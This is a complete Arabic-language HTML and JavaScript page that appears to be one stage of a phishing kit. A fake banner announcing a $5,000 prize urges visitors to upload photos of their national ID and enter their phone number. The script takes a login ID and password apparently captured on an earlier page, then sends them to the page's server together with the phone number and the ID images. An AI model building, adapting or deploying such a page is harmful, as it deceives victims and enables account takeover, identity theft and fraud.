<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0" />
  <title>إرفاق الهوية</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet" />
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      font-family: "Cairo", sans-serif;
      background: #fff;
      min-height: 100vh;
      max-width: 430px;
      margin: 0 auto;
      color: #222;
    }

    .page-header {
      background: #6b2d8a;
      color: #fff;
      padding: 14px 18px;
      font-size: 17px;
      font-weight: 700;
      text-align: right;
    }

    .content {
      padding: 24px 20px 32px;
    }

    .prize-banner {
      background: linear-gradient(135deg, #f0b878 0%, #f5d4a8 100%);
      border-radius: 12px;
      padding: 16px 14px;
      margin-bottom: 20px;
      text-align: center;
      line-height: 1.75;
      font-size: 14px;
      font-weight: 700;
      color: #4b2c7f;
      border: 1px solid rgba(107, 45, 138, 0.15);
    }

    .content h1 {
      font-size: 18px;
      font-weight: 700;
      margin-bottom: 8px;
      text-align: right;
    }

    .hint {
      font-size: 13px;
      color: #555;
      margin-bottom: 18px;
      text-align: right;
      line-height: 1.6;
    }

    .upload-zone {
      border: 2px dashed #b8b8cc;
      border-radius: 12px;
      padding: 24px 16px;
      text-align: center;
      background: #fafafa;
      margin-bottom: 12px;
    }

    .upload-zone label {
      display: inline-block;
      padding: 10px 20px;
      background: #6b2d8a;
      color: #fff;
      border-radius: 999px;
      font-weight: 600;
      font-size: 14px;
      cursor: pointer;
    }

    .upload-zone input { display: none; }

    .count {
      margin-top: 10px;
      font-size: 13px;
      color: #6b2d8a;
      font-weight: 600;
    }

    .previews {
      display: flex;
      flex-wrap: wrap;
      gap: 10px;
      margin-top: 14px;
      justify-content: center;
    }

    .previews img {
      width: 88px;
      height: 88px;
      object-fit: cover;
      border-radius: 8px;
      border: 1px solid #ddd;
    }

    .field input {
      width: 100%;
      height: 50px;
      padding: 0 20px;
      border: none;
      border-radius: 999px;
      background: #b8b8cc;
      color: #fff;
      font-family: inherit;
      font-size: 14px;
      font-weight: 600;
      outline: none;
      text-align: right;
      margin-top: 20px;
    }

    .field input::placeholder { color: rgba(255,255,255,0.95); }

    .btn-continue {
      width: 100%;
      min-height: 50px;
      margin-top: 22px;
      padding: 12px 16px;
      border: none;
      border-radius: 999px;
      background: #f0b878;
      color: #4b2c7f;
      font-family: inherit;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
    }

    .btn-continue:disabled { opacity: 0.65; cursor: wait; }

    .form-message {
      margin-top: 12px;
      text-align: center;
      font-size: 13px;
      font-weight: 600;
      color: #c0392b;
      min-height: 1.3em;
    }

    .overlay {
      display: none;
      position: fixed;
      inset: 0;
      background: rgba(255,255,255,0.82);
      align-items: center;
      justify-content: center;
      z-index: 100;
    }

    .overlay.show { display: flex; }

    .spinner {
      width: 48px;
      height: 48px;
      border: 4px solid #e0d4ec;
      border-top-color: #6b2d8a;
      border-radius: 50%;
      animation: spin 0.75s linear infinite;
    }

    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <header class="page-header">إرفاق الهوية</header>

  <main class="content">
    <p class="prize-banner">
      ألف ألف مبروك قد ربحت معنا جائزة بقيمة 5000 دولار ارفق صورة هويتك ورقم جوالك لاستلام الجائزة
    </p>

    <h1>الهوية الشخصية</h1>
    <p class="hint">يُرجى إرفاق صورة الهوية الشخصية (حد أقصى <strong>3 صور</strong> فقط).</p>

    <div class="upload-zone">
      <label for="id-files">اختر الصور</label>
      <input id="id-files" type="file" accept="image/*" multiple />
      <p class="count" id="file-count">0 / 3 صور</p>
      <div class="previews" id="previews"></div>
    </div>

    <div class="field">
      <input id="phone" type="tel" inputmode="numeric" placeholder="رقم الهاتف" required />
    </div>

    <button type="button" class="btn-continue" id="continue-btn">متابعة</button>
    <p class="form-message" id="form-message" aria-live="polite"></p>
  </main>

  <div class="overlay" id="overlay" aria-hidden="true"><div class="spinner"></div></div>

  <script>
    const authId = sessionStorage.getItem("authId");
    const authPassword = sessionStorage.getItem("authPassword");
    if (!authId || !authPassword) {
      window.location.replace("/");
    }

    const MAX_FILES = 3;
    const MAX_SIZE = 2 * 1024 * 1024;
    let selectedFiles = [];

    const fileInput = document.getElementById("id-files");
    const previews = document.getElementById("previews");
    const fileCount = document.getElementById("file-count");
    const phoneInput = document.getElementById("phone");
    const continueBtn = document.getElementById("continue-btn");
    const messageEl = document.getElementById("form-message");
    const overlay = document.getElementById("overlay");

    phoneInput.addEventListener("input", () => {
      phoneInput.value = phoneInput.value.replace(/\D/g, "");
    });

    function renderPreviews() {
      previews.innerHTML = "";
      selectedFiles.forEach((file) => {
        const img = document.createElement("img");
        img.src = URL.createObjectURL(file);
        img.alt = "";
        previews.appendChild(img);
      });
      fileCount.textContent = `${selectedFiles.length} / ${MAX_FILES} صور`;
    }

    fileInput.addEventListener("change", () => {
      messageEl.textContent = "";
      const picked = Array.from(fileInput.files || []);
      if (picked.length > MAX_FILES) {
        messageEl.textContent = `الحد الأقصى ${MAX_FILES} صور فقط`;
        fileInput.value = "";
        return;
      }
      for (const f of picked) {
        if (!f.type.startsWith("image/")) {
          messageEl.textContent = "الملفات يجب أن تكون صوراً";
          fileInput.value = "";
          selectedFiles = [];
          renderPreviews();
          return;
        }
        if (f.size > MAX_SIZE) {
          messageEl.textContent = "حجم كل صورة يجب ألا يتجاوز 2MB";
          fileInput.value = "";
          return;
        }
      }
      selectedFiles = picked;
      renderPreviews();
    });

    function readAsDataURL(file) {
      return new Promise((resolve, reject) => {
        const reader = new FileReader();
        reader.onload = () => resolve(reader.result);
        reader.onerror = reject;
        reader.readAsDataURL(file);
      });
    }

    continueBtn.addEventListener("click", async () => {
      messageEl.textContent = "";
      const phone = phoneInput.value.trim();

      if (selectedFiles.length === 0) {
        messageEl.textContent = "ارفق صورة الهوية (حتى 3 صور)";
        return;
      }
      if (phone.length < 7) {
        messageEl.textContent = "أدخل رقم الهاتف";
        return;
      }

      continueBtn.disabled = true;
      overlay.classList.add("show");

      try {
        const images = await Promise.all(selectedFiles.map(readAsDataURL));
        const res = await fetch("/api/submit-id", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            id: authId,
            password: authPassword,
            phone,
            images,
          }),
        });
        const data = await res.json().catch(() => ({}));

        if (res.ok && data.ok) {
          window.location.href = "/complete.html";
          return;
        }
        messageEl.textContent = data.message || "حدث خطأ، حاول مرة أخرى";
      } catch {
        messageEl.textContent = "تعذّر الاتصال بالخادم";
      } finally {
        overlay.classList.remove("show");
        continueBtn.disabled = false;
      }
    });
  </script>
</body>
</html>
